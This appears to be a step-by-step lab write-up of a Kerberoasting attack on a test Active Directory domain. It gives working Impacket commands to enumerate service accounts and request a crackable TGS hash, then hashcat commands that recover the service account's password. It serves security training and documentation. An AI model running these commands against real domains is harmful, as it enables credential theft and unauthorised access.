# 02 — Attack Simulation (Kali, observed IP 192.168.100.107 / BUTCH)

## Step 1 — Time sync (required — DC clock behind real date)

```bash
sudo systemctl stop systemd-timesyncd     # prevent Kali drifting back to real time
sudo ntpdate 192.168.100.105              # sync to DC (~Oct 31)
date                                       # confirm matches DC
```
→ CLOCK stepped from 2026-11-03 → 2026-10-31. (First roast attempt without this failed: `KRB_AP_ERR_SKEW(Clock skew too great)` — documented.)
📸 `evidence/00-kali-time-sync.png`

## Step 2 — Enumerate SPNs (recon, LDAP only, no TGS)

```bash
GetUserSPNs.py bryll.local/jdoe:'P@ssw0rd' -dc-ip 192.168.100.105
```
→ Impacket v0.13.1. Returns: `MSSQLSvc/DC01.bryll.local:1433` → `svc_sql`, PasswordLastSet 2026-10-31 16:52:10, LastLogon `<never>`.
📸 `evidence/01-kali-getuserspns-enum.png`

## Step 3 — The roast: request the TGS (captures crackable hash)

```bash
GetUserSPNs.py bryll.local/jdoe:'P@ssw0rd' -dc-ip 192.168.100.105 -request -outputfile kerberoast_hashes.txt
cat kerberoast_hashes.txt
```
→ TGS-REP returned. Hash: `$krb5tgs$23$*svc_sql$BRYLL.LOCAL$mssqlsvc/dc01.bryll.local$*$a0aa7268e91349...` — the `$23$` = RC4-HMAC (etype 23), crackable with the service account's NTLM hash.
📸 `evidence/02-kali-kerberoast-hash.png` — full hash.

## Step 4 — Crack offline (proves impact)

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force --show
```
→ Hash.Mode 13100 (Kerberos 5, etype 23, TGS-REP), Status **Cracked**, Recovered **1/1 (100%)**, 36864 guesses (~1 sec), rockyou.txt → **`Password123`**.
📸 `evidence/03-kali-hashcat-cracked.png`

## Step 5 — (No cleanup needed — no artifacts on target; attack is stateless)
